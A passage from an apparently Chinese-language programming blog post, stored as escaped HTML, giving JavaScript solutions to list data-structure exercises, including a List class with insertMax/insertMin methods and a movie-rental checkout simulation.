class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">displayList</span>(<span class=\"params\">list</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (list.front(); list.hasNext(); list.next()) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (list.getElement() <span class=\"keyword\">instanceof</span> Customer) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">        list.getElement()[<span class=\"string\">\"name\"</span>] + <span class=\"string\">\", \"</span> + list.getElement()[<span class=\"string\">\"movie\"</span>]</span><br><span class=\"line\">      );</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(list.getElement());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 检出电影</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkOut</span>(<span class=\"params\">name, movie, movieList, customerList, checkOutMovieList</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (movieList.contains(movie)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> c = <span class=\"keyword\">new</span> Customer(name, movie);</span><br><span class=\"line\">    customerList.append(c);</span><br><span class=\"line\">    movieList.remove(movie);</span><br><span class=\"line\">    <span class=\"comment\">// 练习4</span></span><br><span class=\"line\">    checkOutMovieList.append(movie);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nCheckOutMovieList: \\n\"</span>);</span><br><span class=\"line\">    displayList(checkOutMovieList);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(movie + <span class=\"string\">\" is not available.\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 练习5</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkIn</span>(<span class=\"params\">name, movie, movieList, customerList, checkOutMovieList</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> c = customerList.dataStore.find(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> element.name === name &amp;&amp; element.movie === movie;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">  customerList.remove(c);</span><br><span class=\"line\">  movieList.append(movie);</span><br><span class=\"line\">  checkOutMovieList.remove(movie);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 测试+++++++++++++++++++++++++++++++</span></span><br><span class=\"line\"><span class=\"comment\">// 模拟读取数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> moviesStr =</span><br><span class=\"line\">  <span class=\"string\">\"肖申克的救赎，教父，教父2，低俗小说，黄金三镖客，十二怒汉，辛德勒名单，黑暗骑士，指环王：王者归来，搏击俱乐部，星球大战5：帝国反击战，飞越疯人院，指环王：护戒使者，盗梦空间，好家伙，星球大战，七武士，黑客帝国，阿甘正传，上帝之城\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> movies = moviesStr.split(<span class=\"string\">\"，\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用列表管理电影数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> movieList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\">movies.forEach(<span class=\"function\"><span class=\"params\">element</span> =&gt;</span> &#123;</span><br><span class=\"line\">  movieList.append(element);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 使用列表管理客户数据</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> customerList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> checkOutMovieList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"Available movies: \\n\"</span>);</span><br><span class=\"line\">displayList(movieList);</span><br><span class=\"line\">checkOut(<span class=\"string\">\"Jovysun\"</span>, <span class=\"string\">\"教父\"</span>, movieList, customerList, checkOutMovieList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nCustomer Rentals: \\n\"</span>);</span><br><span class=\"line\">displayList(customerList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nMovies Now Available\\n\"</span>);</span><br><span class=\"line\">displayList(movieList);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"after check-in+++++++++++++++++++++++++++++++++++++++\"</span>);</span><br><span class=\"line\">checkIn(<span class=\"string\">\"Jovysun\"</span>, <span class=\"string\">\"教父\"</span>, movieList, customerList, checkOutMovieList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nCustomer Rentals: \\n\"</span>);</span><br><span class=\"line\">displayList(customerList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nMovies Now Available\\n\"</span>);</span><br><span class=\"line\">displayList(movieList);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"\\nCheckOutMovieList: \\n\"</span>);</span><br><span class=\"line\">displayList(checkOutMovieList);</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>《数据结构与算法 JavaScript 描述》</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>数据结构列表相关练习题。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"练习一\"><a href=\"#练习一\" class=\"headerlink\" title=\"练习一\"></a>练习一</h2><p>增加一个向列表中插入元素的方法，该方法只在待插元素大于列表中的所有元素时才执行插入操作。这里的大于有多重含义，对于数字，它是数值上的大小；对于字母，它是在字母表中出现的先后顺序。（代码见练习二）</p>\n<h2 id=\"练习二\"><a href=\"#练习二\" class=\"headerlink\" title=\"练习二\"></a>练习二</h2><p>增加一个向列表中插入元素的方法，该方法只在待插元素小于列表中的所有元素时才执行插入操作。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 练习一和练习二</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">List</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = []; <span class=\"comment\">//初始化一个空数组来保存列表元素</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  append(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.listSize++] = element;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  find(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  remove(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> foundAt = <span class=\"keyword\">this</span>.find(element);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (foundAt &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(foundAt, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize--;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  lenth() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insert(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> insertPos = <span class=\"keyword\">this</span>.find(after);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (insertPos &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(insertPos, <span class=\"number\">0</span>, element);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insertMax(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> isMax = <span class=\"keyword\">this</span>.dataStore.every(<span class=\"function\"><span class=\"params\">value</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"regexp\">/^[a-zA-Z]+$/</span>.test(element) &amp;&amp; <span class=\"regexp\">/^[a-zA-Z]+$/</span>.test(value)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element.charCodeAt(<span class=\"number\">0</span>) &gt; value.charCodeAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element &gt; value;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isMax) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.insert(element, after);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insertMin(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> isMin = <span class=\"keyword\">this</span>.dataStore.every(<span class=\"function\"><span class=\"params\">value</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"regexp\">/^[a-zA-Z]+$/</span>.test(element)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element.charCodeAt(<span class=\"number\">0</span>) &lt; value.charCodeAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element &lt; value;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isMin) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.insert(element, after);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  clear() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.length = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  contains(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  front() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  end() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"keyword\">this</span>.listSize - <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  prev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos--;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  next() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  currPos() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  moveTo(position) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = position;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  getElement() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.pos];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasNext() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &lt; <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasPrev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &gt;= <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 练习一、二测试</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> nums = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\">nums.append(<span class=\"number\">5</span>);</span><br><span class=\"line\">nums.append(<span class=\"number\">7</span>);</span><br><span class=\"line\">nums.append(<span class=\"number\">6</span>);</span><br><span class=\"line\">nums.insertMax(<span class=\"number\">10</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\">nums.insertMax(<span class=\"number\">4</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\">nums.insertMin(<span class=\"number\">1</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\">nums.insertMin(<span class=\"number\">15</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(nums);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> letterList = <span class=\"keyword\">new</span> List();</span><br><span class=\"line\">letterList.append(<span class=\"string\">\"f\"</span>);</span><br><span class=\"line\">letterList.insertMax(<span class=\"string\">\"F\"</span>, <span class=\"string\">\"f\"</span>);</span><br><span class=\"line\">letterList.insertMax(<span class=\"string\">\"z\"</span>, <span class=\"string\">\"f\"</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(letterList);</span><br></pre></td></tr></table></figure>\n<h2 id=\"练习三\"><a href=\"#练习三\" class=\"headerlink\" title=\"练习三\"></a>练习三</h2><p>创建 Person 类，改类用于保存人的姓名和性别信息。创建一个至少包含 10 个 Person 对象的列表。写一个函数显示列表中所有拥有相同性别的人。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">List</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore = []; <span class=\"comment\">//初始化一个空数组来保存列表元素</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  append(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.listSize++] = element;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  find(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  remove(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> foundAt = <span class=\"keyword\">this</span>.find(element);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (foundAt &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(foundAt, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize--;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  lenth() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  insert(element, after) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> insertPos = <span class=\"keyword\">this</span>.find(after);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (insertPos &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.dataStore.splice(insertPos, <span class=\"number\">0</span>, element);</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.listSize++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  clear() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> <span class=\"keyword\">this</span>.dataStore;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.dataStore.length = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.listSize = <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  contains(element) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"keyword\">this</span>.dataStore.length; i++) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.dataStore[i] === element) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  front() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  end() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = <span class=\"keyword\">this</span>.listSize - <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  prev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos--;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  next() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos++;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  currPos() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  moveTo(position) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.pos = position;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  getElement() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.dataStore[<span class=\"keyword\">this</span>.pos];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasNext() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &lt; <span class=\"keyword\">this</span>.listSize;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  hasPrev() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.pos &gt;= <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义客户类</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(name, sex) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.sex = sex;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  toString() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"\\nname: \"</span> + <span class=\"keyword\">this</span>.name + <span class=\"string\">\"@\"</span> + <span class=\"string\">\"sex: \"</span> + <span class=\"keyword\">this</span>.sex;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> personList = <span class=\"keyword\">new</span> 